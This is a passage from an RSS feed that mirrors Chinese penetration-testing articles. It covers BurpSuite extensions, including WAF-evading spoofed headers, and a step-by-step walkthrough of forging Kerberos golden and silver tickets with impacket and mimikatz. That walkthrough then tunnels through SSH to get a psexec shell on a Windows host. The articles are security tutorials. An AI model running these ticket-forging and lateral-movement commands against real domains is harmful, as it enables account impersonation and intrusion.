End&lt;/code&gt;&lt;p&gt;如图：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-52d79adfe259b032088783d56217f2d8.png_r.jpg&quot; data-rawwidth=&quot;845&quot; data-rawheight=&quot;169&quot;&gt;&lt;p&gt;&lt;i&gt;插件的开发语言为 ruby，所以插件为 .rb 格式，插件的保存目录为 /usr/share/whatweb/plugins 可以查看别人是怎么写的插件。&lt;/i&gt;&lt;/p&gt;&lt;p&gt;参考链接：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;官方的插件文档： &lt;a href=&quot;https://github.com/urbanadventurer/WhatWeb/wiki/How-to-develop-WhatWeb-plugins&quot;&gt;urbanadventurer/WhatWeb&lt;/a&gt; &lt;/li&gt;&lt;li&gt;官方的在线指纹识别网站: &lt;a href=&quot;https://www.whatweb.net/&quot;&gt;Next generation web scanner.&lt;/a&gt; &lt;/li&gt;&lt;li&gt;项目主页: &lt;a href=&quot;https://github.com/urbanadventurer/WhatWeb&quot;&gt;urbanadventurer/WhatWeb&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-07-21-28017554</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>BurpSuite 几个扩展的使用</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-06-25-27545785.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;BurpSuite 几个扩展的使用&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27545785&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;前言&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;BurpSuite 是一个辅助渗透的工具，它提供了简单的 HTTP 的抓包改包、数据枚举模块到各种安全漏洞的手动式扫描与爬虫式扫描，以及很多经常会用到的小工具。它的主要模块 Proxy / Scanner / Spider 等都设计了接口可以很方便的使用 Java / Python 或是
Javascript 进行编写扩展，我们也可以在应用内的扩展商城 BApp Store 中直接勾选安装其它人共享的渗透测试扩展，类型非常丰富。&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;插件安装&lt;br&gt;&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-45f9c4089eb37a285b8d32aa4f71e270.png_r.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;294&quot;&gt;&lt;h2&gt;XSS
Validator&lt;/h2&gt;&lt;p&gt;用来自动检测当前网站是否存在 XSS 漏洞。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;使用准备：&lt;/b&gt;&lt;br&gt; 安装phantomJS，下载地址：&lt;a href=&quot;https://translate.googleusercontent.com/translate_c?depth=2&amp;amp;hl=zh-CN&amp;amp;prev=search&amp;amp;rurl=translate.google.com&amp;amp;sl=en&amp;amp;sp=nmt4&amp;amp;u=http://phantomjs.org/&amp;amp;usg=ALkJrhgQk-eQa7djfhPAHBDMF0BvuwkdIQ&quot; data-editable=&quot;true&quot; data-title=&quot;http://phantomjs.org/&quot; class=&quot;&quot;&gt;http://phantomjs.org/&lt;/a&gt;，此过程不再赘述。（将 phantomJS 加入到环境变量中，方便使用）。&lt;p&gt;安装好的 XSS validator，页面如下：&lt;/p&gt;&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c8358d53841433f7c3485452f6335798.png_r.jpg&quot; data-rawwidth=&quot;553&quot; data-rawheight=&quot;352&quot;&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;使用方式&lt;/b&gt;&lt;br&gt;&lt;p&gt;在cmd命令提示符窗口执行命令 :&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;phantomjs xss.js&lt;/code&gt;&lt;p&gt;xss.js 这个文件在插件安装目录下的xss-detector文件夹下，若该文件夹下没有，可以去&lt;a href=&quot;https://github.com/nVisium/xssValidator&quot; data-editable=&quot;true&quot; data-title=&quot;nVisium/xssValidator&quot; class=&quot;&quot;&gt;https://github.com/nVisium/xssValidator&lt;/a&gt;下载，并复制到插件安装目录中。控制台界面显示如下，并无其他提示信息。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4e0321a196cab93309fb9281984c665d.png_r.jpg&quot; data-rawwidth=&quot;553&quot; data-rawheight=&quot;59&quot;&gt;&lt;/p&gt;&lt;p&gt;配置 payload：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-84a66a7316b030457a22fb106bef80a6.png_r.jpg&quot; data-rawwidth=&quot;608&quot; data-rawheight=&quot;403&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7a568224bc6682ed69daf4e60168f606.png_r.jpg&quot; data-rawwidth=&quot;592&quot; data-rawheight=&quot;365&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e30064e1139b9966d1cbac5472722162.png_r.jpg&quot; data-rawwidth=&quot;537&quot; data-rawheight=&quot;453&quot;&gt;&lt;br&gt;&lt;/p&gt;&lt;br&gt;&lt;/li&gt;&lt;li&gt;然后 start attack，跳出来的页面显示：成功触发 XSS 攻击的有效负载将被存在“ fy7sdufsuidfhuisdf ”标志所指出，如下所示：&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8c86ca7656e24b15fa032841e494d493.png_r.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;351&quot;&gt;&lt;/li&gt;&lt;li&gt;可以看到，响应报文中存在 XSS 漏洞的均被标出。若要验证某一个 XSS 漏洞的效果，选中&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e195e7f60b4fd0423d4b9ffd342c192a.png_r.jpg&quot; data-rawwidth=&quot;553&quot; data-rawheight=&quot;350&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9be34538a575c4cc62f6e5958fd0db0c.png_r.jpg&quot; data-rawwidth=&quot;401&quot; data-rawheight=&quot;183&quot;&gt;复制该地址到浏览器（设置了代理）中打开即可。 &lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;Notes&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;notes 是用来管理在渗透过程中创建的外部文件。&lt;/p&gt;&lt;p&gt;安装后的界面如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1543a70582b2989f5ba0a41fb2936024.png_r.jpg&quot; data-rawwidth=&quot;238&quot; data-rawheight=&quot;340&quot;&gt;&lt;br&gt;&lt;ul&gt;&lt;li&gt;Export Tab ：将单个备注导出为外部文件。&lt;br&gt;&lt;/li&gt;&lt;li&gt;Save Notes： 将当前打开的所有备注保存在一个文件中。&lt;br&gt;&lt;/li&gt;&lt;li&gt;Load Notes：打开以前保存的一组备注。&lt;br&gt;&lt;/li&gt;&lt;li&gt;New Text ：新建注释文本。&lt;br&gt;&lt;/li&gt;&lt;li&gt;New Spreadsheet：新建电子表格。&lt;br&gt;&lt;/li&gt;&lt;li&gt;Import Text：导入文本文档的内容。&lt;br&gt;&lt;/li&gt;&lt;li&gt;Import Spreadsheet：导入电子表格。&lt;br&gt;&lt;br&gt;还可以将发送HTTP请求和响应到 Notes：&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0e227016e44437ee66fd19b90d46f203.png_r.jpg&quot; data-rawwidth=&quot;553&quot; data-rawheight=&quot;317&quot;&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;Bypasswaf&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;WAF（web 应用防火墙）会检查请求的 HTTP 头。具体实现是检查头 X-originating-IP 的请求。而利用 BurpSuite 可以轻松的在请求里添加标头以绕过某些 WAF 产品。此扩展程序将自动将以下标头添加到所有请求中： &lt;/p&gt;&lt;ul&gt;&lt;li&gt;X-Originating-IP：127.0.0.1&lt;br&gt;&lt;/li&gt;&lt;li&gt;X-Forwarded-For：127.0.0.1&lt;br&gt;&lt;/li&gt;&lt;li&gt;X-Remote-IP：127.0.0.1&lt;br&gt;&lt;/li&gt;&lt;li&gt;X-Remote-Addr：127.0.0.1&lt;br&gt;&lt;/li&gt;&lt;li&gt;X-Client-IP：127.0.0.1&lt;br&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt; 使用方式：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;在burp中创建一个会话处理规则以此来激活该插件。&lt;img src=&quot;https://pic1.zhimg.com/v2-2e02ebdfaa3da75f45eb20fbfabe2873.png_r.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;305&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b88cc527d98b1f3af215d1c72b764ea8.png_r.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;369&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-dc5b68b8753f70e63c7a23699cf67c6d.png_r.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;134&quot;&gt;&lt;p&gt;启用您想要使用该插件的所有工具，然后设置范围。&lt;img src=&quot;https://pic1.zhimg.com/v2-c3efcb15dcbc7c71bf3d6792f425ea84.png_r.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;341&quot;&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;激活所有配置&lt;img src=&quot;https://pic1.zhimg.com/v2-8dfddc1a0a63fe1929907ff7f1fa6b7c.png_r.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;415&quot;&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;Random IP Address Header&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个扩展会自动生成 IPV6 和 IPV4 的地址头来躲避 WAF 的过滤。这种扩展可以在使用 Imperva WAF 的攻击站点或者在 Akamai CDN 背后躲避 WAF 规则的时候提供帮助。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-acb919563784b14f40cc989d7b726274.png_r.jpg&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;301&quot;&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;Python Scripter&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;该扩展在每个 HTTP 请求和由 Burp 处理的响应中执行自定义的 Python 脚本。&lt;/p&gt;&lt;p&gt;使用时，将 Python 脚本键入或粘贴到 “Scrip” 选项卡中，并以正常的方式使用 Burp。该脚本将针对每个 HTTP 请求和响应执行。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Sentinel&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;使用 BurpSentinel，渗透测试人员可以快速轻松地将大量恶意请求发送给 HTTP 请求的参数，来检测当前网站是否有漏洞。不仅如此，它还显示了与响应相对应的 HTTP 响应的大量信息。此工具只能发现漏洞，而不能利用漏洞。&lt;/p&gt;&lt;p&gt;&lt;i&gt;注：本插件只能在 burpsuite 专业版里使用。&lt;/i&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt; 将抓到的包send to sentinel&lt;img src=&quot;https://pic1.zhimg.com/v2-f9753a3d69ad016181e312d1bd701559.png_r.jpg&quot; data-rawwidth=&quot;587&quot; data-rawheight=&quot;351&quot;&gt;&lt;/li&gt;&lt;li&gt; 选择攻击方式&lt;img src=&quot;https://pic1.zhimg.com/v2-3f2dacef07dc8f5a9401ed28d804c646.png_r.jpg&quot; data-rawwidth=&quot;589&quot; data-rawheight=&quot;335&quot;&gt;&lt;/li&gt;&lt;li&gt; 选择应该被攻击的参数，send&lt;img src=&quot;https://pic1.zhimg.com/v2-c8299457099c9cd48147016298a4ab23.png_r.jpg&quot; data-rawwidth=&quot;576&quot; data-rawheight=&quot;275&quot;&gt;&lt;/li&gt;&lt;li&gt; Go 收到攻击时发送的http请求列表&lt;img src=&quot;https://pic1.zhimg.com/v2-eede51ed1ac46d9f399001901913c404.png_r.jpg&quot; data-rawwidth=&quot;575&quot; data-rawheight=&quot;329&quot;&gt;&lt;p&gt;有V的代表检测到了漏洞&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9c9bfb8c9c47003eb2db658530e6064d.png_r.jpg&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;113&quot;&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-26d057f686d352430b1fcc51bd6518be.png_r.jpg&quot; data-rawwidth=&quot;655&quot; data-rawheight=&quot;751&quot;&gt;另外还可以查看原始请求与攻击请求的差异&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1fb482385138eab3c13aeb811729c1ca.png_r.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;121&quot;&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;参考：&lt;/b&gt;&lt;/p&gt;&lt;a href=&quot;https://github.com/nVisium/xssValidator&quot; data-editable=&quot;true&quot; data-title=&quot;nVisium/xssValidator&quot; class=&quot;&quot;&gt;https://github.com/nVisium/xssValidator&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://t0data.gitbooks.io/burpsuite/chapter19.html&quot; data-editable=&quot;true&quot; data-title=&quot;第十九章 使用Burp、PhantomJS进行XSS检测&quot; class=&quot;hover&quot;&gt;https://t0data.gitbooks.io/burpsuite/chapter19.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://nvisium.com/blog/2014/01/31/accurate-xss-detection-with-burpsuite/&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;nVisium: The Intersection of Software and Security&quot;&gt;nVisium: The Intersection of Software and Security&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.codewatch.org/blog/?p=408&quot; class=&quot;&quot; data-editable=&quot;true&quot; data-title=&quot;Bypass WAF: Burp Plugin to Bypass Some WAF Devices&quot;&gt;Bypass WAF: Burp Plugin to Bypass Some WAF Devices&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/codewatchorg/bypasswaf&quot; data-editable=&quot;true&quot; data-title=&quot;codewatchorg/bypasswaf&quot; class=&quot;&quot;&gt;https://github.com/codewatchorg/bypasswaf&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/dobin/BurpSentinel/wiki/BurpSentinel---HowTo-and-introduction&quot; data-editable=&quot;true&quot; data-title=&quot;dobin/BurpSentinel&quot; class=&quot;&quot;&gt;https://github.com/dobin/BurpSentinel/wiki/BurpSentinel---HowTo-and-introductio&lt;/a&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-06-25-27545785</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>如何通过 SSH 隧道进行域渗透的 PtT 攻击</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-06-09-27242393.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;如何通过 SSH 隧道进行域渗透的 PtT 攻击&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27242393&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;b&gt;前言&lt;/b&gt;&lt;/h2&gt;如果我们在渗透过程中能够拿到用户的 TGT，并能将其导入到内存，那么就可以冒充该用户获得其访问权限，这就是 Pass the ticket（PtT）。PtT 技术使用 Kerberos ticket 来代替明文密码或 NTLM 散列。大多数的 PtT 都用的是 golden ticket 和 silver ticket。通常来说，通过PtT 技术获得一台主机的控制权限是非常容易的，但是通过 ssh隧道的 PtT 攻击技术就较为复杂了。&lt;p&gt;曾经遇到过这样的情况：我们在没有特权 ssh 访问到dmz区中的一台带有内网连接的linux主机的条件下却意外地获得了目标的 krbtgt 和机器账户的 NTLM 散列值。这个网络拓扑大概是这样的：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-aa14c60a63a768f1448b49689262daa4.png_r.jpg&quot; data-rawwidth=&quot;553&quot; data-rawheight=&quot;304&quot;&gt;当我们试图在网络分段的部分对一些敏感的主机进行域内划分的时候，可能就会遇到这种类似的情况，这篇文章我们将着重介绍如何通过 SSH隧道 pass golden ticket 和 silver ticket。作为本文的一个示例，我们将尝试通过位于10.0.10.81的Linux主机来对Windows主机win-rmjbtdb7qtf进行攻击。&lt;p&gt;&lt;br&gt;&lt;b&gt;Golden Tickets&lt;/b&gt;&lt;br&gt;&lt;br&gt;Golen Tickets（伪造的TGT tickets）提供了攻击者一些用以长久化访问域控、在网络中进行跨域访问，以及作为不存在的用户去访问网络资源的方法。想了解Golden Tickets的详细信息的话，可以去看看这个：&lt;a href=&quot;https://adsecurity.org/?p=1640&quot; data-title=&quot;Kerberos Golden&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;Kerberos Golden&lt;/a&gt;。攻击者只需要一台安装了&lt;a href=&quot;https://github.com/CoreSecurity/impacket&quot; data-editable=&quot;true&quot; data-title=&quot;impacket&quot;&gt;impacket&lt;/a&gt;和proxychains工具的linux的主机，并且这台主机不需要加入域环境中。&lt;/p&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;伪造 ticket&lt;/b&gt;&lt;/h2&gt;要创建一个golden ticket，通常我们需要从目标域获取到以下信息：&lt;br&gt;&lt;ol&gt;&lt;li&gt;krbtgt账户的nt哈希值&lt;br&gt;&lt;/li&gt;&lt;li&gt;目标域的sid&lt;/li&gt;&lt;li&gt;目标域的fqdn(全称域名)&lt;/li&gt;&lt;li&gt;模拟的账户&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;br&gt;我们将使用impacket的一个样例脚本 &lt;a href=&quot;https://github.com/CoreSecurity/impacket/blob/master/examples/ticketer.py&quot; data-title=&quot;ticketer.py&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;ticketer.py&lt;/a&gt;来创建golden tickets的凭证缓存(ccache)文件。下面是为用户mbroda创建ccache文件的语法示例:&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da&lt;/code&gt;&lt;p&gt;为了使impacket的脚本使用ccache文件进行身份验证，而不是提供明文密码或NT哈希，我们需要将KRB5CCNAME变量设置为ccache文件的绝对路径:&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;export KRB5CCNAME=/path/to/ccache/file&lt;/code&gt;&lt;p&gt;验证变量是否设置正确我们使用下面的语句：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;echo $KRB5CCNAME&lt;/code&gt;&lt;p&gt;现在，我们就可以使用-k参数让支持Kerberos身份验证的impacket脚本使用golden tickets，而不是去提供明文密码或NT哈希来进行身份验证。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;名称解析&lt;/b&gt;&lt;/h2&gt;为了确保Kerberos身份验证过程成功，我们需要修改攻击者机器/etc/hosts文件，以包含目标域控制器的FQDN和目标主机的NetBIOS名称。下面就是个修改的例子：&lt;code lang=&quot;text&quot;&gt;127.0.0.1 localhost
192.168.26.129 amity.local
192.168.26.128  WIN-RMJBTDB7QTF&lt;/code&gt;&lt;p&gt;如果你还没有域控主机的IP地址，那么你可以通过ssh会话连接的linux在目标域上之执行nslookup，例如：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;nslookup -type=srv _ldap._tcp.AMITY.LOCAL&lt;/code&gt;&lt;h2&gt;&lt;b&gt;代理设置&lt;/b&gt;&lt;/h2&gt;我们将使用proxychains在ssh通道上来实现一个域内的漫游，检查配置文件的最后一行来验证proxychains代理的端口，kali下配置文件默认位置是/etc/proxychains.conf。&lt;p&gt;注意:如果您在执行攻击时遇到名称解析的问题，您可能需要在proxychains配置文件中对proxydns设置进行注释。&lt;/p&gt;&lt;p&gt;当我们通过ssh会话连接到目标的linux主机的时候，使用-D参数对应着proxychains设置的端口。这将在我们本地主机的端口上创建一个可以利用proxychains实现域内漫游的socks代理。例如：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;ssh unpriv@10.0.10.81 -D 1337&lt;/code&gt;&lt;p&gt;为了验证代理通道的创建是否成功，我们可以通过proxychains代理nmap的TCP扫描方式扫描目标主机的445端口。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;proxychains nmap -sT -Pn -p 445 192.168.26.128&lt;/code&gt;&lt;h2&gt;&lt;b&gt;时间同步&lt;/b&gt;&lt;/h2&gt;如果攻击机的时间比目标域控距离快大约5分钟的话，golden tickets就无法正常的工作。&lt;p&gt;如果真如以上所述，我们可以使用net time来检查目标的时间(下面的第1行)，并在攻击者机器(第2行)上设置时间：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;proxychains net time -S &amp;lt;IP-of-DC&amp;gt;
proxychains net time set -S &amp;lt;IP-of-DC&amp;gt;&lt;/code&gt;&lt;h2&gt;&lt;b&gt;发起攻击&lt;/b&gt;&lt;/h2&gt;等一切都已准备就绪，我们可以使用任何支持ccache身份验证的工具来攻击目标主机。Impacket的psexec.py就是这样一个工具，运行一下命令后将反弹回一个交互式的CMD：&lt;code lang=&quot;text&quot;&gt;proxychains ./psexec.py mbrody-da@WIN-RMJBTDB7QTF -k -no-pass&lt;/code&gt;&lt;p&gt;如果你在攻击时遇到错误，检查相关的配置，并且使用psexec.py的 -debug参数进行错误排除。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Silver Tickets&lt;/b&gt;&lt;/h2&gt;Silver Tickets(伪造的TGS Tickets)将用户认证为一个在主机上运行的服务，并为攻击者提供隐秘和持久的选项，这些是golden tickets所没有的。更多有关信息可以点击：&lt;a href=&quot;https://adsecurity.org/?p=2011&quot; data-editable=&quot;true&quot; data-title=&quot;文章&quot;&gt;文章&lt;/a&gt;。&lt;p&gt;这次攻击需要一个Linux主机，安装有&lt;a href=&quot;https://github.com/CoreSecurity/impacket&quot; data-editable=&quot;true&quot; data-title=&quot;Impacket&quot;&gt;Impacket&lt;/a&gt;和proxychains，并且还有一台安装了&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot; data-editable=&quot;true&quot; data-title=&quot;Mimikatz&quot;&gt;Mimikatz&lt;/a&gt;和&lt;a href=&quot;https://github.com/gentilkiwi/kekeo&quot; data-editable=&quot;true&quot; data-title=&quot;kekeo&quot;&gt;kekeo&lt;/a&gt;的Windows主机。两个主机都不需要成为域成员。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;伪造 ticket&lt;/b&gt;&lt;/h2&gt;&lt;br&gt;要生成一个silver ticket，我们需要以下信息:&lt;br&gt;&lt;ol&gt;&lt;li&gt;目标主机账户NTLM散列值&lt;br&gt;&lt;/li&gt;&lt;li&gt;目标主机的fqdn&lt;/li&gt;&lt;li&gt;目标服务&lt;/li&gt;&lt;li&gt;目标域的sid&lt;/li&gt;&lt;li&gt;目标域的fqdn&lt;/li&gt;&lt;li&gt;模拟的账户&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;在本例中，我们将通过SMB协议对目标主机进行身份验证，因此我们将使用CIFS服务，有人列出了一份普通的&lt;a href=&quot;https://adsecurity.org/?page_id=183&quot; data-editable=&quot;true&quot; data-title=&quot;spn清单&quot;&gt;spn清单&lt;/a&gt;，这个可以在silver ticket中使用。&lt;br&gt;&lt;br&gt;在这个时候我们就不能用ticketer.py来生成我们的silver ticket。我们在准备好的windows主机上使用mimikatz来生成silver ticket的kirbi文件,接下来使用kekeo来将我们的silver ticket转化为ccache文件。&lt;br&gt;&lt;br&gt;使用Mimikatz的&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos&quot; data-editable=&quot;true&quot; data-title=&quot;Kerberos模块&quot;&gt;Kerberos模块&lt;/a&gt;用如下命令生成silver ticket:&lt;code lang=&quot;text&quot;&gt;kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE&lt;/code&gt;&lt;p&gt;下面是为用户mbroda和CIFS服务创建ticket的示例:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;kerberos::golden /user:mbrody-da /domain:amity.local /sid:S-1-5-21-2972629792-1506071460-1188933728 /target:WIN-RMJBTDB7QTF.amity.local /rc4:9f5dc9080322414141c92ff51efb952d /service:cifs&lt;/code&gt;&lt;p&gt;退出mimikatz，并启动kekeo，使用以下语法将kirbi文件转换为ccache文件:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;misc::convert ccaches /path/to/ticket1.kirbi /path/to/ticket2.kirbi ...&lt;/code&gt;&lt;p&gt;拷贝这个ccache文件到攻击的Linux主机。确保在Linux主机上记录这个文件的绝对路径；我们将使用这个路径去设置我们的KRB5CCNAME变量。接下来的工作就全是我们的linux主机完成的了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击过程&lt;/b&gt;&lt;/h2&gt;剩下的silver ticket攻击设置基本类似于“golden ticket”，但有两个例外。&lt;p&gt;首先，我们需要在/etc/hosts文件中提供目标主机的FQDN，而不是之前的NetBIOS名。对于我们的示例，/etc/hosts文件应该是这样的:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;127.0.0.1 localhost
192.168.26.129 amity.local
192.168.26.128  WIN-RMJBTDB7QTF.amity.local&lt;/code&gt;&lt;p&gt;第二个区别是我们需要将我们的攻击机的时间与目标主机同步,silver ticket不需要与我们的目标域控进行通信。&lt;/p&gt;&lt;p&gt;遵循上面的步骤，设置KRB5CCNAME变量，检查proxychains配置，建立SSH隧道做socks代理，并使用nmap验证代理可用。我们现在可以通过目标主机的fqdn使用psexec.py脚本进行攻击了。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;proxychains python psexec.py mbrody-da@WIN-RMJBTDB7QTF.amity.local -k -no-pass&lt;/code&gt;&lt;h2&gt;&lt;b&gt;小结&lt;/b&gt;&lt;/h2&gt;Golden ticket和silver ticket技术为攻击者提供了持续和隐秘的技术，但是都需要向目标主机转发连接来实现这一目的。当攻击者在域渗透时可能发现自己有了一些ssh权限，但是却只能通过Linux主机间接到达目标主机，在这些场景中，可以通过proxychains挂代理通过SSH隧道执行PtT攻击。这篇文章介绍了使用psexec.py在目标主机上发起攻击的情况，其实其他任何支持-k参数的任何有效脚本都可以进行攻击。&lt;p&gt;参考：&lt;a href=&quot;qq://txfile/#&quot; data-title=&quot;https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/&quot; class=&quot;&quot;&gt;https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/&lt;/a&gt;&lt;/p&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-06-09-27242393</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Backslash Powered Scanning</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-05-30-27166471.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Backslash Powered Scanning&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27166471&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;b&gt;摘要&lt;/b&gt;&lt;/h2&gt;&lt;br&gt;现有的web扫描器通过在某个参数上利用大量特定payload进行测试或者寻找特征来找寻服务端的注入漏洞--几乎像一个杀软。在本文中，作将分享另一种扫描方式的概念和开发过程，这种扫描方式能够发现和确认已知与未知类型的注入漏洞。这种方式从经典的手工检测进化而来，拥有手工测试的众多优势，例如WAF避规，极小的网络痕迹和针对过滤的灵活输入。&lt;br&gt;&lt;br&gt;与以往相同，这种方式依然会设法利用一些对于经验丰富的手工测试者来说十分熟悉的漏洞。作者将通过展示几千个网站的样例来分享一些有趣的发现和教训，并放出一个特定的扫描工具。最后，作者将展示这款工具如何能被继续开发，让你有更多的研究方向。&lt;h2&gt;介绍&lt;/h2&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0f189c008e0e9a61ef8b8f77127f4c0a.png_r.jpg&quot; data-rawwidth=&quot;880&quot; data-rawheight=&quot;843&quot;&gt;&lt;br&gt;web应用程序扫描器被广泛认为是只能识别’low-hanging fruit’（注释:容易摘的果子，形容唾手可得）-- 很明显任何人都能找到的漏洞，这通常是一个公正的判断；与手工测试相比，自动扫描器依赖于大量特定技术的payload，缺乏应变性意味着即使是最先进的扫描器也不能像人类一样识别某些明显的漏洞。在某种意义上，这种比较也是不公平的--扫描器越来越擅长发现客户端的问题，例如跨站点脚本(XSS)，甚至能通过动态与静态分析识别出基于DOM的XSS。然而，黑盒扫描器对服务端的运作缺乏了解，因此他们通常难以检测出服务端的注入漏洞，例如SQL注入，代码注入，命令注入。&lt;p&gt;在这篇文章中，作者将拆分出扫描器对服务端注入漏洞检测的三个核心盲点，接着展示如何实现一个从手工检测进化而来的扫描方式，作者将开发一个开源扫描器能够检测远高于’low-hanging fruit’的漏洞。特别是，作者将展示这个扫描器能够在发现漏洞类之前，检测出服务端的模板注入(SSTI)漏洞。&lt;/p&gt;&lt;p&gt;这个扫描器作为一个Burpsuite的插件能够从BApp store中获取到，源代码也可以从Github中获取到：&lt;a href=&quot;https://github.com/PortSwigger/backslash-powered-scanner&quot; data-title=&quot;backslash-powered-scanner&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;backslash-powered-scanner&lt;/a&gt;，&lt;a href=&quot;https://github.com/PortSwigger/distribute-damage&quot; 